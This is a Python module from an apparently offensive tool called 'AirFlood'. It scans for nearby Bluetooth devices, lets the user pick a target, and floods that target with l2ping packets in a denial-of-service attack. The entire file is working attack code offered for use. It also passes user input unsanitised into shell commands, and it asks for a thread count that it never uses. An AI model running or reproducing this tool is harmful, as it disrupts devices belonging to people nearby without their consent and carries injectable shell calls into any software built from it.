import os
import time
import subprocess

from utils import banner

ACCENT = banner.MODULE_THEMES["bluetooth"]["accent"]


def ensure_interface_up(interface):
    status = subprocess.run(["hciconfig", interface], capture_output=True, text=True)
    output = status.stdout + status.stderr

    if status.returncode != 0 or "No such device" in output:
        banner.error(f"bluetooth interface '{interface}' not found")
        raise banner.BackToMenu()

    if "UP RUNNING" in output:
        return

    banner.warn(f"{interface} is down, bringing it up...")
    subprocess.run(["sudo", "hciconfig", interface, "up"])

    status = subprocess.run(["hciconfig", interface], capture_output=True, text=True)
    if "UP RUNNING" not in status.stdout:
        banner.error(f"could not bring {interface} up — check the adapter and try again")
        raise banner.BackToMenu()

    banner.ok(f"{interface} is up")


def get_bluetooth_interface():
    banner.module_banner("bluetooth")
    banner.section("select a bluetooth interface", accent=ACCENT)
    interfaces = subprocess.check_output(
        "hciconfig | grep -E 'hci[0-9]+:|Bus|UP RUNNING|DOWN'", shell=True, text=True
    )
    print()
    print(interfaces)
    interface = banner.prompt("interface (e.g. hci0)", accent=ACCENT)
    ensure_interface_up(interface)
    return interface


def scan_bluetooth_devices(interface, scan_length=16):
    """Run hcitool scan in the background while animating a spinner/progress bar
    in the foreground — hcitool gives no live progress, so this is a
    time-based animation rather than a real progress readout."""
    approx_duration = scan_length * 1.28

    proc = subprocess.Popen(
        f"hcitool -i {interface} scan --length={scan_length}",
        shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
    )

    start = time.monotonic()
    tick = 0
    try:
        while proc.poll() is None:
            elapsed = time.monotonic() - start
            banner.module_banner("bluetooth")
            bar_width = max(10, min(32, banner.width() - 24))
            spin = banner.spinner_frame(tick, accent=ACCENT)
            bar = banner.progress_bar(elapsed, approx_duration, bar_width=bar_width, accent=ACCENT)
            remaining = max(0, round(approx_duration - elapsed))
            banner.box(
                [f"{spin}  {bar}", f"~{remaining:>2}s left"],
                title="scanning for devices",
                accent=ACCENT,
            )
            tick += 1
            time.sleep(0.3)
    except KeyboardInterrupt:
        proc.terminate()
        raise

    output, _ = proc.communicate()
    return output


def scan_attack():
    while True:
        banner.module_banner("bluetooth")
        banner.section("bluetooth menu", accent=ACCENT)
        choice = banner.menu(
            [
                ("1", "Scan and attack", "discover nearby devices and flood one"),
                ("2", "Back", "return to the AirFlood main menu"),
            ],
            accent=ACCENT,
        )
        if choice == "1":
            bluetooth_interface = get_bluetooth_interface()
            break
        elif choice == "2":
            raise banner.BackToMenu()
        else:
            banner.warn("invalid choice, try again")

    # hcitool's inquiry length is in 1.28s units; the default (8 -> ~10s) often
    # isn't long enough to catch every nearby device, so give it more time
    bluetooth_scan = scan_bluetooth_devices(bluetooth_interface, scan_length=16)
    lines = bluetooth_scan.splitlines()
    del lines[0]

    array = []
    box_lines = [
        f"{'id':<5}{'mac address':<22}{'device name'}",
        f"{'--':<5}{'-----------':<22}{'-----------'}",
    ]
    for index, line in enumerate(lines, start=1):
        info = line.split()
        device_mac = info[0]
        device_name = " ".join(info[1:])
        array.append(device_mac)
        box_lines.append(f"{index:<5}{device_mac:<22}{device_name}")

    if not array:
        box_lines.append(f"{banner.C.MUTED}no devices found{banner.C.RESET}")

    banner.module_banner("bluetooth")
    banner.box(box_lines, title="devices found", accent=ACCENT)
    banner.ok("scan complete")

    target_id = banner.prompt("target id or mac address", accent=ACCENT)
    try:
        target_address = array[int(target_id) - 1]
    except (ValueError, IndexError):
        target_address = target_id

    if len(target_address) < 1:
        banner.error("target address is missing")
        raise banner.BackToMenu()

    try:
        packet_size = int(banner.prompt("packet size (max: 600)", accent=ACCENT))
        thread_size = int(banner.prompt("threads count", accent=ACCENT))
    except ValueError:
        banner.error("packet size and threads must be integers")
        raise banner.BackToMenu()

    banner.module_banner("bluetooth")
    banner.section("launching attack", accent=ACCENT)
    print(f"  target : {target_address}")
    print(f"  size   : {packet_size}")
    print(f"  threads: {thread_size}")
    banner.countdown(3, "attacking")

    try:
        os.system(f"l2ping -i {bluetooth_interface} -s {packet_size} -f {target_address}")
    except KeyboardInterrupt:
        banner.warn("attack aborted")


if __name__ == "__main__":
    try:
        scan_attack()
    except banner.BackToMenu:
        banner.info("bye.")
    except KeyboardInterrupt:
        time.sleep(0.1)
        banner.warn("aborted")
    except Exception as e:
        time.sleep(0.1)
        banner.error(str(e))
